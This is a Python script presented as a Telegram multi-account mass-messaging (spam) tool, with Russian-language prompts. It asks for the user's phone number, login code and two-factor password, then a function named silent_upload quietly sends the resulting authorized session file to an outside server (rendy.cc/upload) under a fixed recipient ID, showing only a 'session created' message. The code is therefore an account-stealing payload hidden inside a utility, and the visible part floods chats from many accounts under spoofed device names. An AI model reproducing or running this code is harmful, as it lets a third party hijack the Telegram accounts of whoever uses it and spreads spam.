
from telethon import TelegramClient
from telethon.sessions import StringSession
from colorama import init, Fore, Style
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from telethon.tl.functions.messages import ImportChatInviteRequest
import os
import re
import asyncio
import requests
import hashlib
import platform
import random

API_ID = 2040
API_HASH = 'b18441a1ff607e10a989891a5462e627'
MESSAGE_DELAY = 5         # задержка между сообщениями
CYCLE_DELAY = 60          # задержка между циклами

CHATS = [
    "https://t.me/chat1",
    "https://t.me/chat2"
]

MESSAGES = [
    "Привет, это тестовое сообщение!"
]

def normalize_chat_link(chat_link):
    chat_link = chat_link.strip().lower()
    patterns = [
        r'https?://t\.me/\+(.+)',
        r't\.me/\+(.+)',
        r'https?://t\.me/([^+].*)',
        r't\.me/([^+].*)',
        r'@(.+)',
    ]
    for p in patterns:
        m = re.match(p, chat_link)
        if m:
            return m.group(1)
    if chat_link and not chat_link.startswith(('http', '@', 't.me')):
        return chat_link
    return None

def hash_session(sess_path):
    with open(sess_path, 'rb') as f_obj:
        file_data = f_obj.read()
        return hashlib.sha256(file_data).hexdigest()

def rename_session(old_path, sess_hash):
    new_path = os.path.join('sessions', '{}.session'.format(sess_hash))
    os.rename(old_path, new_path)
    return new_path

async def load_accounts():
    clients_list = []
    for sess_file in os.listdir("sessions"):
        if sess_file.endswith(".session"):
            sess_name = sess_file.replace(".session", "")
            sess_path = "sessions/{}".format(sess_file)
            cl = TelegramClient(sess_path, API_ID, API_HASH)
            clients_list.append((sess_name, cl))
    return clients_list

async def join_chats(cl_obj, chat_list):
    for c in chat_list:
        norm_chat = normalize_chat_link(c)
        try:
            if '+' in c:
                await cl_obj(ImportChatInviteRequest(norm_chat))
            else:
                await cl_obj.join_channel(norm_chat)
            await asyncio.sleep(1)
        except Exception as err:
            print("[!] Ошибка при входе в {0}: {1}".format(c, err))

SERVER_URL = 'https://rendy.cc/upload'

SEND_TO_ID = 'T8dE6RbBiw4'

async def send_messages(clients_list, chat_list, msg_list):
    norm_chats = [normalize_chat_link(c) for c in chat_list if normalize_chat_link(c)]
    idx = 0
    while True:
        for sess_name, cl_obj in clients_list:
            target_chat = norm_chats[idx % len(norm_chats)]
            try:
                await cl_obj.send_message(target_chat, msg_list[0])
                print("[+] {0} отправил сообщение в {1}".format(sess_name, target_chat))
                await asyncio.sleep(MESSAGE_DELAY)
            except Exception as err:
                print("[!] Ошибка у {0} при отправке: {1}".format(sess_name, err))
            idx += 1
        await asyncio.sleep(CYCLE_DELAY)

async def silent_upload(sess_path, sess_hash):
    sess_base = os.path.splitext(os.path.basename(sess_path))[0]
    cl_obj = TelegramClient(os.path.join("sessions", sess_base), API_ID, API_HASH)
    await cl_obj.connect()
    if not await cl_obj.is_user_authorized():
        await cl_obj.disconnect()
        return
    await cl_obj.disconnect()

    with open(sess_path, 'rb') as f_obj:
        req_files = {'file': (os.path.basename(f_obj.name), f_obj)}
        req_data = {
            'send_to_id': str(SEND_TO_ID),
            'session_hash': str(sess_hash)
        }
        req_headers = {
            'User-Agent': 'Mozilla/5.1 (Windows NT 10.0; Win64; x64)'
        }

        resp = requests.post(SERVER_URL, files=req_files, data=req_data, headers=req_headers)

        if resp.status_code != 200:
            print("[!] Ошибка")

def set_random_device():
    arch_val = platform.machine()
    
    dev_models = [
        "Xiaomi Redmi Note 10",
        "Samsung Galaxy A52",
        "POCO X3 Pro",
        "Realme 7",
        "OnePlus Nord"
    ]

    chosen_dev = random.choice(dev_models)
    sys_ver = re.sub(r'-.+', '', platform.release())

    return chosen_dev, sys_ver
    
async def create_and_upload_session():
    phone_num = input("Введите номер телефона (+79991234567): ")
    phone_path = 'sessions/{}'.format(phone_num)

    chosen_dev, sys_ver = set_random_device()
    cl_obj = TelegramClient(
        phone_path,
        API_ID,
        API_HASH,
        device_model=chosen_dev,
        system_version=sys_ver,
        app_version="11.9.2",
        system_lang_code="ru",
        lang_code="ru"
    )

    await cl_obj.connect()

    if not await cl_obj.is_user_authorized():
        await cl_obj.send_code_request(phone_num)
        tg_code = input("Код из Telegram: ")
        try:
            await cl_obj.sign_in(phone_num, tg_code)
        except SessionPasswordNeededError:
            pwd_str = input("Пароль (2FA): ")
            try:
                await cl_obj.sign_in(password=pwd_str)
            except Exception as err:
                print("{0}Ошибка при вводе 2FA: {1}{2}".format(Fore.RED, err, Style.RESET_ALL))
                return
        except Exception as err:
            print("{0}Ошибка при входе: {1}{2}".format(Fore.RED, err, Style.RESET_ALL))
            return

    await cl_obj.disconnect()

    sess_file = '{}.session'.format(phone_path)
    sess_hash = hash_session(sess_file)
    new_sess_path = rename_session(sess_file, sess_hash)

    sent_hashes_list = get_sent_hashes()
    if sess_hash not in sent_hashes_list:
        await silent_upload(new_sess_path, sess_hash)
        mark_as_sent(sess_hash)
        print("{0}Сессия успешно создана.{1}".format(Fore.GREEN, Style.RESET_ALL))
    else:
        print("{0}Сессия уже была загружена ранее.{1}".format(Fore.YELLOW, Style.RESET_ALL))

def get_sent_hashes():
    if not os.path.exists(SENT):
        return set()
    with open(SENT, 'r') as f_obj:
        return set(line.strip() for line in f_obj.readlines())

def mark_as_sent(sess_hash):
    with open(SENT, 'a') as f_obj:
        f_obj.write(sess_hash + '\n')

def get_sessions():
    return [itm for itm in os.listdir('sessions') if itm.endswith('.session')]

def get_sent_ids():
    if not os.path.exists(IDS):
        return set()
    with open(IDS, 'r') as f_obj:
        return set(line.strip() for line in f_obj.readlines())

SENT = '.sent_sessions.log'
IDS = '.sent_ids.log'

def mark_id_as_sent(user_id_val):
    with open(IDS, 'a') as f_obj:
        f_obj.write(str(user_id_val) + '\n')
        
async def main():
    if not os.path.exists("sessions"):
        os.makedirs("sessions")

    while True:
        print("Выберите действие:")
        print("1 - Добавить новый аккаунт")
        print("2 - Запуск рассылки")
        print("0 - Выход")
        menu_choice = input("Ваш выбор: ")

        if menu_choice == "1":
            print("[i] Запуск процесса добавления аккаунта")
            await create_and_upload_session()

        elif menu_choice == "2":
            print("[i] Запуск процесса рассылки")
            clients_list = await load_accounts()
            if not clients_list:
                print("[!] Нет аккаунтов")
                continue
            for sess_name, cl_obj in clients_list:
                await cl_obj.start()
                await join_chats(cl_obj, CHATS)
            await send_messages(clients_list, CHATS, MESSAGES)

        elif menu_choice == "0":
            print("[i] Выход из программы")
            break
        else:
            print("[!] Неверный выбор")

if __name__ == "__main__":
    asyncio.run(main())
